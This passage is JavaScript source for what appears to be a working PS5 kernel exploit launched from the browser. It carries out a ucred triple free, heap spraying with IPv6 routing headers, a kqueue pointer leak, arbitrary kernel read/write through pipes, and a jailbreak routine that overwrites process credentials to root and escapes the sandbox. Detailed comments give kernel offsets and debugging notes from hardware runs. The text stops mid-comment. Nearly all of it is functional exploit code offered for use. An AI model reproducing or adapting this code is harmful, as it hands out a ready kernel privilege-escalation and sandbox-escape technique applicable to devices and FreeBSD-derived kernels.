     * looked from the outside. ~20 beacons across the budget. */
    beacon("find_triplet begin master=" + master + " other=" + other);
    // verbose diagnostics (cheap in-loop counters, beaconed only at round
    // boundaries so timing is untouched): nz = master read back non-zero,
    // tag = read carried our RTHDR_TAG, self = tag but j==master (self-match),
    // last = last non-zero value seen. other=-1 with nz=0 means the master's
    // chunk was never reclaimed; tag>0 with self/oob j means overlap landed wrong.
    let nz = 0, tag = 0, self = 0, lastVal = 0, lastLen = 0;
    for (let a = 0; a < TRIPLET_ATTEMPTS; a++) {
        if (a && (a & 0xFF) === 0) {
            beacon("find_triplet round " + a + " nz=" + nz + " tag=" + tag
                   + " self=" + self + " last=0x" + lastVal.toString(16)
                   + " len=" + lastLen);
            // FAIL-FAST (RE'd from verbose runs 2026-08-08): the master is never
            // re-sprayed in this loop, so once its read is NULL it stays NULL.
            // nz==0 after 512 rounds => the third free released no reclaimable
            // chunk (the code's own bimodal case, line ~1591) and no spray can
            // revive it -> provably dead. Winnable runs read nz>0 from the first
            // rounds. Abort now instead of grinding ~5000 (~4 min) on a corpse.
            if (a >= 512 && nz === 0) {
                beacon("find_triplet DEAD nz=0 @round " + a
                       + " (master rthdr NULL; third free released nothing) -> reboot");
                return -1;
            }
        }
        for (let i = 0; i < IPV6_SOCK_NUM; i++) {
            if (i === master || i === other) continue;
            wr32at(ST.spray_rthdr, 0x04, (RTHDR_TAG | i) >>> 0);
            set_rthdr(ST.ipv6_socks[i], ST.spray_rthdr, ST.spray_len);
        }
        wr32at(ST.leak_rthdr, 0x04, 0);      // same stale-read hazard
        setLeakLen(8);
        get_rthdr(ST.ipv6_socks[master], ST.leak_rthdr, ST.leak_len_ptr);
        const val = rd32at(ST.leak_rthdr, 0x04);
        if (val) { nz++; lastVal = val; lastLen = rd32at(ST.leak_len_ptr, 0) >>> 0; }
        const j = val & 0xFFFF;
        if ((val & 0xFFFF0000) === (RTHDR_TAG >>> 0)) {
            tag++;
            if (j === master || j === other) self++;
        }
        if ((val & 0xFFFF0000) === (RTHDR_TAG >>> 0) &&
            j !== master && j !== other && j < IPV6_SOCK_NUM) {
            beacon("triplet FOUND j=" + j + " round=" + a + " nz=" + nz
                   + " tag=" + tag + " self=" + self);
            return j;
        }
    }
    beacon("find_triplet EXHAUSTED master=" + master + " nz=" + nz + " tag="
           + tag + " self=" + self + " last=0x" + lastVal.toString(16));
    return -1;
}

/* -------------------------------------------------------- the triple free */

// poops.c:615 trigger_ucred_triple_free. ERR_TRIPLE_FREE in poops.lua maps here:
// a clean failure means the race was lost, not that the port is wrong.
function ucred_triple_free() {
    log("triple free");

    // iov_base = 1 so the kernel reads it back as cr_refcnt == 1
    wr64at(ST.msg_iov, 0x00, 1);
    wr64at(ST.msg_iov, 0x08, 1);

    const set_buf = mem.alloc(8);
    const clear_buf = mem.alloc(8);

    const dummy_sock = sys.socket(AF_UNIX, SOCK_STREAM, 0);
    wr32at(set_buf, 0, dummy_sock);

    // [PS5] slot-based netcontrol; -1 lets the kernel choose, else retry slot 1
    let slot = 0;
    if (sys.netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8) !== 0) {
        log("netcontrol: falling back to slot 1");
        if (sys.netcontrol(1, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8) !== 0)
            throw new Error("netcontrol: all slots occupied");
        slot = 1;
    }
    ST.nc_slot = slot;
    log("SET_QUEUE slot=" + slot);

    sys.close(dummy_sock);

    /* setuid's RESULT is load-bearing and was being discarded.
     *
     * Both calls exist for their allocator side effects: sys_setuid crget()s a
     * new ucred, swaps it in, and crfree()s the old one. That only happens on
     * SUCCESS. On EPERM it allocates a cred, fails the privilege check, frees
     * the cred it just made, and leaves the process cred untouched — so no
     * fresh ucred is installed, uaf_sock's f_cred stays the shared process cred
     * with a large refcnt, and the close(dup(...)) later decrements it from N to
     * N-1 without ever freeing anything. There is then no double free, no
     * aliased chunk, and find_twins reports exactly what we are seeing:
     * self=all, forever, at any attempt count.
     *
     * The reference implementation throws on -1 for both of these; we did not
     * check either, so a privilege failure here was indistinguishable from a
     * lost race. Check them, and report the uid either way. */
    const uid0 = sys.getuid();
    const su1 = sys.setuid(1);                   // allocate a fresh ucred
    ST.uaf_sock = sys.socket(AF_UNIX, SOCK_STREAM, 0);
    const su2 = sys.setuid(1);                   // free the previous one
    beacon("setuid uid_before=" + uid0 + " setuid#1=" + su1 + " setuid#2=" + su2
           + " uid_now=" + sys.getuid());
    if (su1 !== 0 || su2 !== 0)
        throw new Error("ERR_TRIPLE_FREE: setuid(1) failed (" + su1 + "/" + su2
                        + ") from uid " + uid0 + " — no fresh ucred is allocated,"
                        + " so there is nothing to double free");

    /* HARD PRECONDITION, and until now an unchecked one.
     *
     * CLEAR_QUEUE's work function (0xFFFFFFFF80CDBEB0) walks the 3-slot table
     * at ctx+1392 and matches on the stored ID:
     *     if ((slot[20] & 1) && *(int *)(slot + 16) == *a3) -> bzero, return 0
     *     ... otherwise return 5
     * and the handler (0xFFFFFFFF807650B0) only performs its FIRST f_count
     * decrement when that returns 0:
     *     if (!result && atomic_add(fp + 40, -1) == 1) ...   <- drop #1
     *     if (atomic_add(fp + 40, -1) == 1) ...              <- drop #2
     *
     * SET registered dummy_sock's number as the ID, so the CLEAR only performs
     * the DOUBLE drop if uaf_sock lands on the same descriptor - upstream
     * literally comments this step "Reclaim the file descriptor". FreeBSD hands
     * out the lowest free fd so it usually does, but when something else takes
     * it first the IDs differ, only ONE decrement happens, there is no
     * imbalance, no double free, and find_twins then cannot succeed no matter
     * how long it grinds. That is the bimodal failure we have been eating:
     * 45 runs, 17 reached twins.
     *
     * So force it: if the descriptor was not reclaimed, put it back and retry
     * rather than spending a whole run on a doomed state. */
    for (let i = 0; ST.uaf_sock !== dummy_sock && i < 32; i++) {
        const stray = ST.uaf_sock;
        ST.uaf_sock = sys.socket(AF_UNIX, SOCK_STREAM, 0);
        sys.close(stray);                        // free the one that took it
    }
    if (ST.uaf_sock !== dummy_sock) {
        beacon("ABORT fd not reclaimed: uaf=" + ST.uaf_sock
               + " != dummy=" + dummy_sock);
        throw new Error("ERR_TRIPLE_FREE: fd " + dummy_sock + " not reclaimed "
                        + "(got " + ST.uaf_sock + ") — CLEAR_QUEUE would not "
                        + "match and the double free cannot happen");
    }
    beacon("fd reclaimed ok: " + dummy_sock);

    wr32at(clear_buf, 0, ST.uaf_sock);
    // -1, as upstream does in BOTH branches; the work function searches all
    // three slots by ID itself, so naming one is unnecessary and divergent.
    /* CLEAR_QUEUE's result was discarded too, and it is THE step that performs
     * the double f_count drop. Its work function returns non-zero (5) when no
     * slot matches the ID, and the handler then skips the first decrement
     * entirely — one drop instead of two, no imbalance, no double free. That is
     * the same silent dead end as a failed setuid, and it looks identical from
     * find_twins. A non-zero return here is not survivable, so say so. */
    const clr = sys.netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8);
    beacon("CLEAR_QUEUE -> " + clr + " (fd " + ST.uaf_sock + ")");
    if (clr !== 0)
        throw new Error("ERR_TRIPLE_FREE: CLEAR_QUEUE returned " + clr
                        + " — the slot did not match, so only one f_count drop "
                        + "happened and there is no double free");
    log("CLEAR_QUEUE done");

    /* Set cr_refcnt back to 1 — with plain sendmsg on THIS thread, as upstream
     * does, not with the iov worker threads.
     *
     * This is the fix for the `self=all` twins exhaustion: rounds=512
     * nz=76800 tag=76800 self=76800, i.e. 150 sockets x 512 rounds where every
     * socket read back its OWN rthdr and no two ever aliased. That is not a
     * slow race, it is a stuck state — the ucred was never on the free list
     * twice, so no pair can exist however long find_twins grinds.
     *
     * Why the worker version could not work: the ucred is freed by the thread
     * running these syscalls, which init() pinned to MAIN_CORE, so the chunk
     * goes to THAT core's UMA per-CPU bucket. The iov workers are spawned with
     * rop.pin false (deliberately — pinning them wrecks the later race timing,
     * FAILS #5), so each one allocates its iovec from whatever core it happens
     * to land on. A chunk in core 5's bucket is invisible to every other core,
     * so cr_refcnt was simply never written, the dup/close that follows found
     * refcnt > 1, nothing was freed, and there was no double free to find.
     *
     * sendmsg fixes all of it at once and is exactly what poops does here
     * (0x80 iterations, fd 0, msg_iov[0] = {iov_base=1, iov_len=1}):
     *   - it runs on this thread, so the allocation is drawn from the SAME
     *     per-CPU bucket the ucred was freed into;
     *   - sys_sendmsg copyin's the iovec array BEFORE it ever looks at the fd
     *     and frees it on the way out, so each call is an allocate-write-free
     *     that can land on the target repeatedly — fd 0 not being a socket is
     *     irrelevant, and the EFAULT from iov_base=1 is expected;
     *   - 0x17 iovecs = 0x170 bytes, the same malloc bucket as the 0x168 ucred,
     *     with iov_base landing exactly on cr_refcnt.
     * Batched into one chain so all 128 run back-to-back on the pinned thread
     * with no chance to migrate between them. */
    const refcntBatch = [];
    for (let i = 0; i < REFCNT_SENDMSG_N; i++)
        refcntBatch.push([Number(SYSCALL_NUMS.sendmsg), 0n,
                          BigInt(ST.msg_hdr), 0n]);
    window.rop_worker.syscallBatch(refcntBatch);
    beacon("refcnt sendmsg x" + REFCNT_SENDMSG_N + " (same-core, batched)");

    /* The kernel goes DIRTY the instant the double-free happens (inside
     * doubleFreeAndFindTwins below). Set the flag FIRST (synchronous, no yield)
     * so a failure still leaves it set - a re-arm on a dirty kernel is what
     * panics after an otherwise clean ERR_TRIPLE_FREE throw. */
    try { sessionStorage.setItem("netctrl_dirty", "1"); } catch (e) {}

    /* The double-free (close) and the first rthdr spray now run in ONE worker
     * chain (doubleFreeAndFindTwins) so they execute on the SAME core - the freed
     * ucred lands in that core's per-CPU bucket and the same-core spray reclaims
     * it. RE (uma_zalloc_arg @0x8068A250, curcpu<<6): a chunk freed on core A is
     * invisible to any other core; separate syscalls let the worker park+migrate
     * between the free and the spray -> different core -> self=all. Batching (all
     * M_NOWAIT, no park mid-chain) makes free-core == spray-core by construction.
     * Falls back to the per-round find_twins() loop if the batched round misses. */
    const twinsOk = doubleFreeAndFindTwins();
    beacon("phase: double-free + find_twins (batched same-core)");
    if (!twinsOk) throw new Error("ERR_TRIPLE_FREE: twins not found");
    beacon("phase: twins " + ST.twins.join("/"));

    free_rthdr(ST.ipv6_socks[ST.twins[1]]);

    // spin until cr_refcnt reads back as 1 (poops.c:726)
    let ok = false, refcntRound = -1;
    for (let i = 0; i < 0x400; i++) {
        refcntRound = i;
        threads.signal("iov");
        sys.sched_yield();
        /* Clear, and require the kernel to have actually copied something.
         * getsockopt(IPV6_RTHDR) copies ZERO bytes when ip6po_rthdr is NULL
         * and still returns success (ip6_ctloutput 0xFFFFFFFF80862BA0), so an
         * uncleared buffer can hand back a stale 1 from an earlier round. We
         * would then "confirm" cr_refcnt == 1 when it is not, the third free
         * would free nothing, and find_triplet would spray 5000 x 148 times
         * against a chunk that was never released - which is exactly the
         * bimodal behaviour observed: triplet[1] either lands instantly or
         * exhausts the entire budget, never in between. */
        wr32at(ST.leak_rthdr, 0x00, 0);
        setLeakLen(UCRED_SIZE);
        get_rthdr(ST.ipv6_socks[ST.twins[0]], ST.leak_rthdr, ST.leak_len_ptr);
        if (rd32at(ST.leak_len_ptr, 0) >= 4 &&
            rd32at(ST.leak_rthdr, 0x00) === 1) { ok = true; break; }
        threads.drain("iov");
    }
    if (!ok) throw new Error("ERR_TRIPLE_FREE: cr_refcnt never returned to 1");

    /* Same TIGHT-WINDOW rule as the double-free (2026-08-08): no beacon() yield
     * between the THIRD free and find_triplet, or the main thread migrates cores
     * and the third free lands the chunk in a per-CPU freebucket the spray's core
     * cannot reach -> find_triplet reads NULL (nz=0, "third free released
     * nothing"). The cr_refcnt beacon is moved to AFTER find_triplet. */
    ST.triplets[0] = ST.twins[0];
    sys.close(sys.dup(ST.uaf_sock));             // the third free
    const t1 = find_triplet(ST.triplets[0], -1);
    beacon("phase: cr_refcnt back to 1 (round " + refcntRound + ") + triplet");
    if (t1 < 0) throw new Error("ERR_TRIPLE_FREE: triplet[1] not found");
    ST.triplets[1] = t1;

    /* RELEASE the spray here - do not allocate another one.
     *
     * The iov spray left blocked when the cr_refcnt loop broke is holding the
     * 368-byte chunks. Freeing them is what gives find_triplet something to
     * alias; spraying MORE iovs (which this did, via threads.signal) leaves
     * nothing free and the search can never converge, at any attempt count.
     * That is exactly what the beacons showed: triplet[1] found instantly,
     * triplet[2] grinding to exhaustion.
     *
     * Upstream order (Poops.java): write 1 byte to release, THEN findTriplet,
     * THEN waitForFinished + read the byte back. */
    wake_iov();
    let t2 = find_triplet(ST.triplets[0], ST.triplets[1]);
    if (t2 < 0) throw new Error("ERR_TRIPLE_FREE: triplet[2] not found");
    ST.triplets[2] = t2;
    barrier_iov();
    threads.wait("iov");
    reclaim_iov();

    beacon("phase: triplets " + ST.triplets.join("/"));
    return true;
}

/* ---------------------------------------------------------- kqueue leak */

// poops.c:770. ERR_LEAK_KQUEUE maps here. [PS5] both the header magic AND a
// non-zero kq_fdp are required; the magic alone false-positives.
function leak_kqueue() {
    beacon("phase: leak_kqueue begin");
    /* triplets[1], NOT triplets[2] - matches upstream (Poops.java leakKqueue
     * opens with freeRthdr(ipv6Socks[triplets[1]])).
     *
     * This routine frees a socket, leaks the kqueue through triplets[0], and
     * then RE-ACQUIRES triplets[1] via findTriplet(triplets[0], triplets[2]).
     * Freeing triplets[2] here instead meant triplets[2] was never restored -
     * findTriplet excludes it from the spray - so it arrived at kread_slow
     * with a NULL ip6po_rthdr and the free_rthdr(triplets[2]) there became a
     * NO-OP. Nothing was ever released, so the iov spray had no chunk to
     * reclaim and reclaim_iov_over_uio reported exactly 0/512 every time.
     * Confirmed on hardware: "rio P t2 0->0 t0=64". */
    free_rthdr(ST.ipv6_socks[ST.triplets[1]]);

    let kq = -1, leaked = false;
    for (let a = 0; a < KQUEUE_ATTEMPTS; a++) {
        kq = sys.kqueue();
        if (kq === -1) throw new Error("kqueue() failed");

        setLeakLen(0x100);
        get_rthdr(ST.ipv6_socks[ST.triplets[0]], ST.leak_rthdr, ST.leak_len_ptr);

        const hdr = rd64at(ST.leak_rthdr, 0x08);
        const fdp = rd64at(ST.leak_rthdr, KQ_FDP_OFFSET);
        /* fdp !== 0 is far too weak. This pointer is handed straight to a
         * UIO_SYSSPACE bcopy by the first slow read, where a wrong value is a
         * kernel panic and not an error - so require a canonical kernel
         * address and keep hunting otherwise. Accepting garbage here is what
         * ended the last session. */
        if (hdr === 0x1430000n && isKernelPtr(fdp)) { leaked = true; break; }

        sys.close(kq);
        sys.sched_yield();
        kq = -1;
    }
    if (!leaked) throw new Error("ERR_LEAK_KQUEUE: no kqueue aliased");

    ST.kl_lock = rd64at(ST.leak_rthdr, 0x60);
    ST.kq_fdp  = rd64at(ST.leak_rthdr, KQ_FDP_OFFSET);
    /* Beaconed unconditionally, not via log(). The triple free is over by
     * here so one synchronous round trip is affordable, and this is the exact
     * value the kernel is about to bcopy from - if it panics anyway, this line
     * is the only record that survives, since a panic leaves no log at all. */
    beacon("kq_fdp=" + hex(ST.kq_fdp) + " kl_lock=" + hex(ST.kl_lock)
           + " attempts=" + KQUEUE_ATTEMPTS);

    sys.close(kq);

    const t1 = find_triplet(ST.triplets[0], ST.triplets[2]);
    if (t1 < 0) throw new Error("ERR_LEAK_KQUEUE: triplet reacquire failed");
    ST.triplets[1] = t1;
    return true;
}

/* ------------------------------------------------- pipe-backed kernel R/W */

const KRW = {
    scratch: 0n,
    corrupt(cnt, size, buffer) {                 // poops.c:436
        const pb = this.scratch;
        wr32at(pb, 0x00, cnt);
        wr32at(pb, 0x04, 0);
        wr32at(pb, 0x08, 0);
        wr32at(pb, 0x0C, size);
        wr64at(pb, 0x10, buffer);
        sys.write(ST.master_pipe[1], pb, PIPEBUF_SIZE);
        sys.read(ST.master_pipe[0], pb, PIPEBUF_SIZE);
    },
    read(src, dst, n) {
        this.corrupt(n, PAGE_SIZE, src);
        sys.read(ST.victim_pipe[0], dst, n);
    },
    write(dst, src, n) {
        this.corrupt(0, PAGE_SIZE, dst);
        sys.write(ST.victim_pipe[1], src, n);
    },
    r64(a) { this.read(a, this.scratch + 0x20n, 8); return rd64at(this.scratch, 0x20); },
    r32(a) { this.read(a, this.scratch + 0x20n, 4); return rd32at(this.scratch, 0x20); },
    r8(a)  { this.read(a, this.scratch + 0x20n, 1); return rd8(this.scratch, 0x20); },
    w64(a, v) { wr64at(this.scratch, 0x20, v); this.write(a, this.scratch + 0x20n, 8); },
    w32(a, v) { wr32at(this.scratch, 0x20, v); this.write(a, this.scratch + 0x20n, 4); },
    w8(a, v)  { wr8(this.scratch, 0x20, v);    this.write(a, this.scratch + 0x20n, 1); },
};

/* ---------------------------------------------------- process discovery */

// [PS5] poops.c find_allproc — curproc via a pipe's SIGIO owner, then walk the
// list until the pointer lands in kernel space. No kernel-base constant needed,
// which is why this survives across 4.03–12.00 untouched.
function find_allproc() {
    const pbuf = mem.alloc(8);
    sys.pipe(pbuf);
    const rfd = rd32at(pbuf, 0) | 0, wfd = rd32at(pbuf, 4) | 0;

    const pidbuf = mem.alloc(8);
    wr32at(pidbuf, 0, sys.getpid());
    sys.ioctl(rfd, FIOSETOWN, pidbuf);

    const fp     = fget(rfd);
    const f_data = KRW.r64(fp);
    const sigio  = KRW.r64(f_data + PIPE_SIGIO_OFFSET);
    ST.curproc   = KRW.r64(sigio);

    /* Bounded. With a broken KRW this walk never terminates and the run just
     * disappears - no throw, no beacon, nothing to debug. */
    let p = ST.curproc, hops = 0;
    while ((p & 0xFFFFFFFF00000000n) !== 0xFFFFFFFF00000000n) {
        p = KRW.r64(p + 0x08n);
        if (++hops > 0x10000 || p === 0n)
            throw new Error("find_allproc: walk did not reach kernel space after "
                            + hops + " hops (last " + hex(p) + ")");
    }
    beacon("allproc walk hops=" + hops);

    sys.close(wfd); sys.close(rfd);
    ST.allproc = p;
    log("curproc=" + hex(ST.curproc) + " allproc=" + hex(ST.allproc));
    return p;
}

function fget(fd) {
    return KRW.r64(ST.fdt_ofiles + BigInt(fd) * FILEDESCENT_SIZE);
}

function pfind(pid) {
    let p = ST.allproc;
    for (let i = 0; i < 0x1000 && p !== 0n; i++) {
        if ((KRW.r32(p + 0xBCn) | 0) === pid) return p;
        p = KRW.r64(p + 0x00n);
    }
    throw new Error("pfind(" + pid + ") failed");
}

/* -------------------------------------------------------------- jailbreak */

function ps5_jailbreak() {
    /* Validate every pointer before writing through it.
     *
     * This function used to chase p+0x40 / p+0x48 / p+0x3E8 / dyn+0 / eboot+0x40
     * and write to all of them with no checks at all. That is the most dangerous
     * unguarded code in the chain: by the time it runs we hold arbitrary kernel
     * WRITE, so if curproc is wrong or a KRW read returns garbage, it does not
     * fail — it scatters writes across unrelated kernel memory and panics the
     * console, with the log ending mid-run and nothing to attribute it to.
     *
     * Every value here is a kernel pointer that must satisfy isKernelPtr, so
     * checking costs one comparison per hop and converts a panic into a clean
     * throw that run()'s caller can report. */
    const need = (name, v) => {
        if (!isKernelPtr(v))
            throw new Error("ps5_jailbreak: " + name + " = " + hex(v)
                            + " is not a kernel pointer — refusing to write "
                            + "(KRW is unreliable or curproc is wrong)");
        return v;
    };

    const p = need("curproc", ST.curproc);
    const cred = need("p_ucred", KRW.r64(p + 0x40n));
    log("p_ucred=" + hex(cred) + " uid=" + hex(KRW.r32(cred + 0x04n)));

    KRW.w32(cred + 0x04n, 0);   // cr_uid
    KRW.w32(cred + 0x08n, 0);   // cr_ruid
    KRW.w32(cred + 0x0Cn, 0);   // cr_svuid
    KRW.w32(cred + 0x10n, 1);   // cr_ngroups
    KRW.w32(cred + 0x14n, 0);   // cr_rgid
    KRW.w32(cred + 0x18n, 0);   // cr_svgid

    KRW.w64(cred + 0x58n, SYSCORE_AUTHID);
    KRW.w64(cred + 0x60n, 0xFFFFFFFFFFFFFFFFn);
    KRW.w64(cred + 0x68n, 0xFFFFFFFFFFFFFFFFn);
    /* cred+0x82 is deliberately NOT written. It was here on the strength of a
       comment, and the comment was wrong. Every predicate that reads it has the
       same shape (sub_FFFFFFFF80836EA0/EC0/EE0/F00):

           if ( (*(_BYTE *)(cred + 0x6F) & 0x20) == 0 ) return 0;
           if ( *(char *)(cred + 0x82) >= 0 )           return 0;   // bit clear
           return 1;                                                // bit set

       so the bits GRANT - writing 0x00 cleared them and revoked capability
       instead of adding it. Upstream Poops (1.8 jar / 2.0 lua) never touches
       this byte either; it only reads it for its "pre-patch ucred+0x82=" log.
       They are also gated on cred+0x6F, which nothing here sets, so even 0xC0
       would not reliably grant. */
    KRW.w8 (cred + 0x83n, 0x80);   // cr_sceAttr[0], same as upstream

    const p_fd   = need("p_fd", KRW.r64(p + 0x48n));
    const kern   = need("pfind(0)", pfind(KERNEL_PID));
    const kfd    = need("kernel p_fd", KRW.r64(kern + 0x48n));
    const rootvn = need("rootvnode", KRW.r64(kfd + ROOTVNODE_OFFSET));
    KRW.w64(p_fd + 0x08n, rootvn);
    KRW.w64(p_fd + 0x10n, rootvn);
    KRW.w64(p_fd + 0x18n, 0);

    const dyn = need("p_dynlib", KRW.r64(p + 0x3E8n));
    KRW.w64(dyn + 0xF0n, 0);
    KRW.w64(dyn + 0xF8n, 0xFFFFFFFFFFFFFFFFn);

    const eboot = need("eboot obj", KRW.r64(dyn + 0x00n));
    const segs  = need("eboot segs", KRW.r64(eboot + 0x40n));
    KRW.w64(segs + 0x08n, 0);
    KRW.w64(segs + 0x10n, 0xFFFFFFFFFFFFFFFFn);

    log("jailbroken: uid=" + hex(KRW.r32(cred + 0x04n)) +
        " authid=" + hex(KRW.r64(cred + 0x58n)));
    return true;
}

/* ------------------------------------------------------------------- run */

/* ---- post-KRW cleanup, all of it previously MISSING ----------------------
 *
 * Upstream does these immediately after the pipebuf write and before
 * findAllProc; we went straight on. They are not tidying - they are what stops
 * the kernel from later touching memory we freed:
 *
 *   fhold           the pipe pair is now load-bearing for all kernel R/W, so
 *                   bump f_count and stop anything reclaiming it.
 *   remove_rthdr    triplets[0..2] still hold DANGLING ip6po_rthdr pointers
 *                   into the UAF chunk. Closing any of those sockets (or
 *                   process exit) would free it AGAIN.
 *   remove_uaf_file the triple-freed file is still on the free list and will
 *                   be handed to the next socket() caller.
 */
function fhold(fp) {
    KRW.w32(fp + 0x28n, (KRW.r32(fp + 0x28n) + 1) >>> 0);   // f_count
}

function remove_rthdr_from_socket(fd) {
    const fp = fget(fd);
    if (!isKernelPtr(fp)) { beacon("rthdr cleanup: bad fp for fd " + fd); return; }
    const f_data = KRW.r64(fp);
    if (!isKernelPtr(f_data)) return;
    const so_pcb = KRW.r64(f_data + 0x18n);
    if (!isKernelPtr(so_pcb)) return;
    const opts = KRW.r64(so_pcb + IN6P_OUTPUTOPTS_OFFSET);
    if (!isKernelPtr(opts)) return;
    KRW.w64(opts + IP6PO_RHI_RTHDR_OFFSET, 0n);
}

function remove_uaf_file() {
    const uafFile = fget(ST.uaf_sock);
    KRW.w64(ST.fdt_ofiles + BigInt(ST.uaf_sock) * FILEDESCENT_SIZE, 0n);
    let removed = 0, i = 0;
    for (; i < 0x1000 && removed < 3; i++) {
        const s = sys.socket(AF_UNIX, SOCK_STREAM, 0);
        if (s === -1) break;
        if (fget(s) === uafFile) {
            KRW.w64(ST.fdt_ofiles + BigInt(s) * FILEDESCENT_SIZE, 0n);
            removed++;
        }
        sys.close(s);
    }
    beacon("uaf file cleaned removed=" + removed + " iters=" + i);
}

/* A slow read that must yield a KERNEL POINTER, retried until it does.
 *
 * kread_slow rides a UAF race, so it occasionally returns data from the wrong
 * reclaim - observed as 0x4000000001f41 and 0x4000000001fff where a kernel
 * pointer was expected. make_karw chains five reads with each result feeding
 * the next address, so a single bad read poisons everything after it and the
 * address guard then (correctly) refuses to continue.
 *
 * Retrying is cheap and safe: each kread_slow re-acquires the triplets on its
 * way out, so a repeat call is a fresh attempt rather than a corrupted one. */
function KRW_slow_ptr(addr, what) {
    /* Outer attempts. Each re-runs a full kread_slow (frees rthdrs, re-acquires
     * triplets) so retrying erodes aliasing - kept at 3 while the reclaim was
     * NOT converging. RAISED 3 -> 6 (2026-08-08): with UIO/IOV_SPRAY_ROUNDS at
     * 0x4000 the reclaim now converges, and the remaining failure is the 1-byte
     * faulting-copyout desync (soreceive skips the mbuf dequeue on copyout fault
     * @0x8073F960:599 -> a stray marker byte prepends the leaked pointer). That
     * desync is per-attempt fault-timing, so a fresh kread_slow often reads
     * CLEAN; more attempts land a clean read before erosion bites. */
    for (let i = 0; i < 6; i++) {
        let v = 0n, err = null;
        try {
            v = KRW_slow_r64(addr);
        } catch (e) {
            /* A failed reclaim is a RETRYABLE condition, not a fatal one.
             * kread_slow throws "no worker received the read" when every leak
             * buffer is still a sentinel (all 0x41, or all zero because the
             * uio never delivered). Before the zero-sentinel fix that case
             * silently returned 0 and landed here as a bad pointer; now it
             * throws, and letting it escape would abort a run that just needed
             * another attempt. */
            err = (e && e.message) ? e.message : String(e);
        }
        if (!err && isKernelPtr(v)) {
            if (i) beacon("slow ptr " + what + " ok after " + i + " retries");
            return v;
        }
        beacon("slow ptr " + what + (err ? " err=" + err.slice(0, 40)
                                          : " bad=" + hex(v) + " raw=" + lastLeakBytes(8))
               + " @" + hex(addr) + " retry " + (i + 1));
    }
    throw new Error("slow rw: " + what + " never returned a kernel pointer");
}

function make_karw() {
    /* From here on every spray must come from the same core the frees happen
     * on, or UMA's per-CPU buckets hide the freed chunk (kmemzones
     * 0xFFFFFFFF82CE4EC0; 360 and 368 both land in the 512 zone, so the
     * reclaim IS possible - it just has to be on the right CPU). */
    /* PIN DISABLED - measured, not assumed.
     *
     * cpuset_setaffinity returns 1 (EPERM) in the WebKit sandbox: the main
     * thread has NEVER been pinned, all session ("pin core=5 aff=1 rtprio=0").
     * Pinning the spray threads to core 5 therefore forces them onto a core
     * the FREES are not happening on - the main thread floats - which is the
     * exact opposite of what the UMA per-CPU bucket argument requires.
     *
     * With affinity unavailable to us the only coherent option is to let both
     * sides float together, as every earlier stage already does (twins,
     * cr_refcnt and triplets all reclaim fine unpinned). If we ever get
     * affinity - e.g. re-trying it after ps5_jailbreak grants us root - the
     * pin can come back, but it must cover the freeing thread too. */
    rop.pin = false;
    beacon("phase: make_karw (pin OFF - affinity is EPERM in sandbox)");

    // slow reads off the aliased rthdr bootstrap the fast pipe pair
    /* fd_files, validated against a descriptor we KNOW is open.
     *
     * KRW_slow_ptr only proves the value is a canonical kernel pointer, not
     * that it is the right one - and a wrong-but-plausible fd_files poisons
     * every later read. Observed: mrd came back 0x0 seven retries running,
     * which is a full-size read of zeroes rather than garbage, i.e. we were
     * reading a valid address that simply is not the fd table.
     *
     * So cross-check: the entry for master_pipe[0] must itself be a kernel
     * pointer (that fd is definitely open - we created it in setup). If it is
     * not, the fd_files read was wrong; take another. */
    ST.fdt_ofiles = 0n;
    for (let i = 0; i < 8; i++) {
        const cand = KRW_slow_ptr(ST.kq_fdp, "fd_files") + FDT_OFILES_OFFSET;
        const probe = KRW_slow_r64(cand + BigInt(ST.master_pipe[0]) * FILEDESCENT_SIZE);
        if (isKernelPtr(probe)) {
            ST.fdt_ofiles = cand;
            if (i) beacon("fdt_ofiles ok after " + i + " retries");
            break;
        }
        beacon("fdt_ofiles reject " + hex(cand) + " probe=" + hex(probe));
    }
    if (!ST.fdt_ofiles)
        throw new Error("slow rw: fd_files never validated against a live fd");
    log("fdt_ofiles=" + hex(ST.fdt_ofiles));

    const mrf = KRW_slow_ptr(ST.fdt_ofiles + BigInt(ST.master_pipe[0]) * FILEDESCENT_SIZE, "mrf");
    const vrf = KRW_slow_ptr(ST.fdt_ofiles + BigInt(ST.victim_pipe[0]) * FILEDESCENT_SIZE, "vrf");

    /* Report BOTH file pointers and the fds they came from before dereferencing
     * either.
     *
     * A run died here with mrf/vrf/mrd all fine and vrd stuck at
     * 0xa100000000000000 across all six retries — deterministic, so it is a
     * real read of something, not race garbage. isKernelPtr(vrf) only proves
     * vrf is canonical, not that it is a struct file: if the entry we read was
     * stale or the wrong slot, *vrf is whatever that object holds and no amount
     * of retrying changes it. The two pipes are created back to back, so their
     * fds are adjacent and their file pointers normally come from the same
     * allocation run — a vrf wildly unlike mrf is the tell. */
    beacon("pipe files mfd=" + ST.master_pipe[0] + " vfd=" + ST.victim_pipe[0]
           + " mrf=" + hex(mrf) + " vrf=" + hex(vrf)
           + " delta=" + hex(vrf > mrf ? vrf - mrf : mrf - vrf));

    const mrd = KRW_slow_ptr(mrf, "mrd");
    const vrd = KRW_slow_ptr(vrf, "vrd");
    log("master_rpipe_data=" + hex(mrd) + " victim_rpipe_data=" + hex(vrd));

    const pb = mem.alloc(PIPEBUF_SIZE);
    wr32at(pb, 0x00, 0); wr32at(pb, 0x04, 0); wr32at(pb, 0x08, 0);
    wr32at(pb, 0x0C, PAGE_SIZE); wr64at(pb, 0x10, vrd);
    KRW_slow_write(mrd, pb, PIPEBUF_SIZE);

    KRW.scratch = mem.alloc(0x100);

    /* PROVE the pipe primitive before anything relies on it.
     * "arbitrary kernel R/W achieved" only meant the pipebuf write returned -
     * nothing checked the result. When it is silently wrong every later
     * fget() yields garbage, which showed up as "bad fp" on all three rthdr
     * sockets and "uaf file cleaned removed=0 iters=4096". Cross-check the
     * fast path against a value the SLOW path already gave us. */
    /* Use the RETRYING slow-ptr reader for the reference, not a single
     * KRW_slow_r64. *kq_fdp is fd_files (a kernel pointer); the slow read rides a
     * UAF race and can hand back the 0x41 sentinel (see KRW_slow_ptr / line
     * ~1912). A landed run 2026-08-08 died here with fast=0xffffb75e4770c000
     * (correct) vs slow=0x41 (sentinel) - the fast pipe was fine, the reference
     * was flaky. KRW_slow_ptr retries until it yields a kernel pointer, so a bad
     * fast pipe still mismatches but a flaky reference no longer false-fails. */
    /* Do NOT let the flaky slow read block a good fast pipe. The fast pipe is
